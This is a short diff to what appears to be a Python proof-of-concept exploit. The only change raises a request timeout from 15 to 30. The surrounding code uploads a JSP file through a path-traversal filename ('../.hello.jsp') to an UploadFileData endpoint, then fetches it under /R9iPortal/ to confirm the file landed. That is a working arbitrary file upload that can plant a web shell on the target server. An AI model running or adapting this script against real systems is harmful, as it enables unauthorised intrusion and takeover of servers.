@@ -15,7 +15,7 @@ file = {"file": ('asd.jsp',b)}
 def poc(host):
     try:
         target = "{u}/UploadFileData?action=upload_file&filename=../.hello.jsp".format(u=host)
-        r = requests.post(url=target, headers=header, files=file, verify=False, timeout=15)
+        r = requests.post(url=target, headers=header, files=file, verify=False, timeout=30)
         if "showSucceedMsg" in r.text:
             target1 = "{u}/R9iPortal/.hello.jsp".format(u=host)
             r1 = requests.get(url=target1, verify=False, timeout=15)
